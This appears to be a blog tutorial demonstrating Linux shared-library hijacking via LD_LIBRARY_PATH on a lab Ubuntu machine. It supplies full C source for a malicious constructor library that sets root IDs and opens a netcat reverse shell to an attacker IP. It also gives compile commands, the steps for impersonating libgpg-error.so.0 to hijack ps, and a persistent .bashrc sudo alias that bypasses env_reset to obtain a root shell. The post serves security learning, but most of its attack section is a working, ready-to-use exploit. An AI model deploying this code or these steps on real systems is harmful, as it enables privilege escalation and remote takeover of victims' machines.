---
layout: single
title: "Hijacking Shared Libraries"
date: 2024-06-27
categories: [Linux]
tags: [ld-preload, shared-libraries, privilege-escalation, linux]
author_profile: true
toc: true
toc_sticky: true
read_time: true
show_date: true
---

## Introduction To Linux Shared Libraries

You can think of shared libraries as a collection of functions and data designed to be used by multiple programs. They are typically identified by the `.so` (shared object) extension and are linked dynamically at runtime, which not only reduces the size of executables but also boosts system efficiency. However, it's important to note that any changes to a shared library can impact all the programs that rely on it.
In the Linux ecosystem, shared libraries commonly use the Executable and Linkable Format (ELF), a standard file format for executables, object code, shared libraries, etc.

## The Search Path for Shared Libraries

When a Linux application is executed, it follows a specific sequence to locate its required libraries. Once it finds the required library, it stops searching and loads that library. Here’s how the search process works:
- The application first checks the directories listed in its Runtime Library Search Path (`RPATH`), which is embedded within the executable itself.
- Next, it looks in the directories specified in the `LD_LIBRARY_PATH` environment variable. This variable allows users to define custom library paths without modifying the system-wide configuration.
- Similar to RPATH, the Runtime Search Path (`RUNPATH`) is another directory list embedded in the executable but is checked after `LD_LIBRARY_PATH`.
- The application then checks the directories listed in /etc/ld.so.conf configuration file. 
- Finally, the search proceeds to the standard system library directories, which include `/lib`, `/lib64`, `/usr/lib`, `/usr/lib64`.


## Exploiting The Search Path Approach

Looking at how Linux searches for shared libraries reveals a potential security risk: an attacker can manipulate this process by placing malicious versions of libraries in earlier locations, thus controlling the application's behavior. This technique, known as library hijacking, exploits the order in which Linux searches for shared libraries.

One common method involves controlling the `LD_LIBRARY_PATH` environment variable. This variable allows users to override the default library paths, often used for testing new library versions. However, it can also be exploited to inject malicious libraries, altering a program's behavior or even executing harmful code to escalate privileges.

Let’s dive into a practical example. We'll demonstrate how to hijack the execution of a program on a testing machine running Ubuntu by introducing a malicious library called `mylibrary`.

### Writing the Malicious Library

First, we need to create our malicious library. The following C code defines a library that opens a reverse shell when loaded

```C
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static void revShell() __attribute__((constructor));

void revShell() {
	setuid(0);
	setgid(0);
	printf("Reverse Shell via library hijacking... \n");
		const char *ncshell = "nc -e /bin/sh 192.168.171.1 7777 &";
	system(ncshell);
}
```

The first four lines consist of standard header files. Following this, `revShell()` is declared with the constructor attribute. A constructor is a function that executes when the library is first initialized to set up necessary code. After that, the `revShell()` constructor function is implemented. Within this function, we set the user ID (`UID`) and group ID (`GID`) to 0, providing root privileges if executed in a sudo context. Additionally, a message is printed to indicate the execution of the code. Finally, netcat is used to establish a reverse shell, connecting to the attacker's machine on port 7777.

### Compiling the Malicious Library

To compile our shared library, we use the following commands:

```sh
gcc -Wall -fPIC -c mylibrary.c -o mylibrary.o
```

- `-Wall`: Enables all compiler's warning messages.
- `-fPIC`: Generates position-independent code, suitable for shared libraries.
- `-c`: Compiles the code without linking.
- `-o`: Specifies the output file name.

### Creating the Shared Library

After compilation is done, we need to create the shared library. This is done by using the `-shared` parameter to tell `gcc` we’re creating a shared library from our object file. We then specify an output file again, this time with the name `libmylibrary.so`

```sh
gcc -shared mylibrary.o -o libmylibrary.so
```


### Identifying a Suitable Application

After creating our malicious shared library, the next step is to use it. Two considerations arise: firstly, selecting a program that the victim is likely to execute with elevated privileges, and secondly, ensuring that the hijacking of a shared library does not cause the program to crash. Remember, when we hijack a library, it will not be available to that program.

For this demonstration we will use the `ps` command as our target. Users often run ps with sudo to display processes with elevated permissions, making it a suitable candidate for our attack.

Let's identify the libraries `ps` uses. We'll use the `ldd` command on the target machine to list these libraries. The output will include something like:

```sh
ldd /bin/ps
	....
	libgpg-error.so.0 => /lib/x86_64-linux-gnu/libgpg-error.so.0 (0x00007ffff6614000)

```

![alt text](https://github.com/masjadaan/TechSecurityArticles/blob/main/Linux/HijackingSharedLibraries/images/ldd_ps.png)

The `libgpg-error.so.0` library appears to be a good candidate for hijacking. It handles error reporting and is likely to be loaded but not frequently called during normal operation, minimizing the risk of breaking the program.

### Setting Up the Environment

Next, we set up the environment to hijack the `libgpg-error.so.0` library. We will rename our malicious `.so` file to match the target library and configure the `LD_LIBRARY_PATH` to point to the location of our malicious library:

```sh
cd /home/msbit/Labs/shared_lib/ld_lib_path
export LD_LIBRARY_PATH=/home/msbit/Labs/shared_lib/ld_lib_path
cp libmylibrary.so libgpg-error.so.0
```

![alt text](https://github.com/masjadaan/TechSecurityArticles/blob/main/Linux/HijackingSharedLibraries/images/cp.png)

### Executing the Target Program

Before running the ps command with our malicious library, we need to set up a netcat listener on the attacker's machine. This listener will wait for the reverse shell connection on port 7777.

```sh
rlwrap nc -lvp 7777
```

Now, with our environment prepared, we can execute the `ps` command on the target's machine. 

```sh
ps
ps: /home/msbit/Labs/shared_lib/ld_lib_path/libgpg-error.so.0: no version information available (required by /lib/x86_64-linux-gnu/libgcrypt.so.20)
Reverse Shell via library hijacking... 
   PID TTY          TIME CMD
  2023 pts/18   00:00:00 bash
  2824 pts/18   00:00:00 ps
  2826 pts/18   00:00:00 sh
```

On the attacker's terminal, you should now see the reverse shell connection. This output indicates that the shell is running with the privileges of the user who executed the `ps` command. 

![alt text](https://github.com/masjadaan/TechSecurityArticles/blob/main/Linux/HijackingSharedLibraries/images/userpriv.png)

However, if the user runs `ps` command with sudo, no reverse shell will be received at the attacker side, (why is that?).

![alt text](https://github.com/masjadaan/TechSecurityArticles/blob/main/Linux/HijackingSharedLibraries/images/no_reverse_shell.png)


## Gaining Root Shell

One of the challenges in exploiting the `LD_LIBRARY_PATH` environment variable is that most modern operating systems do not pass user environment variables when using `sudo`. This behavior is controlled by the `env_reset` setting in the `/etc/sudoers` file, which is enabled by default. When `env_reset` is active, running a command with `sudo` will not include `LD_LIBRARY_PATH` or other user-defined environment variables. This can limit the effectiveness of our library hijacking attempt, as the malicious library won't be loaded when the program is executed with elevated privileges.

![alt text](https://github.com/masjadaan/TechSecurityArticles/blob/main/Linux/HijackingSharedLibraries/images/sudoers.png)

One trick we can use to bypass this restriction is to create an alias for `sudo` that includes the `LD_LIBRARY_PATH` variable. This method can be applied temporarily in the current terminal session or by adding it to the `.bashrc` file.
- Temporary Alias:

```sh
alias sudo='sudo LD_LIBRARY_PATH=/home/msbit/Labs/shared_lib/ld_lib_path'
```

- Persistent Alias in .bashrc

```sh
echo 'alias sudo="sudo LD_LIBRARY_PATH=/home/msbit/Labs/shared_lib/ld_lib_path"' >> ~/.bashrc
source ~/.bashrc
```
By setting this alias, any command run with sudo will include our modified `LD_LIBRARY_PATH`.

Let's try again, before running the `ps` command with `sudo`, set up a netcat listener on the attacker's machine to capture the reverse shell. Now, execute the `ps` command with `sudo`

```sh
sudo ps
```

On the attacker's terminal, you should see the reverse shell connection. This indicates that the shell is now running with root privileges due to the `sudo` command

![alt text](https://github.com/masjadaan/TechSecurityArticles/blob/main/Linux/HijackingSharedLibraries/images/rootShell.png)


Happy Learning... <br>
Mahmoud Jadaan

### Test Environment

- Victim
  - Ubuntu (16.04.7 LTS (Xenial Xerus), x86_64 GNU/Linux)
  - netcat-traditional/xenial,now 1.10-41 amd64
  - VIM - Vi IMproved 7.4
 
- Attacker
  - Kali GNU/Linux Rolling 6.6.15-2
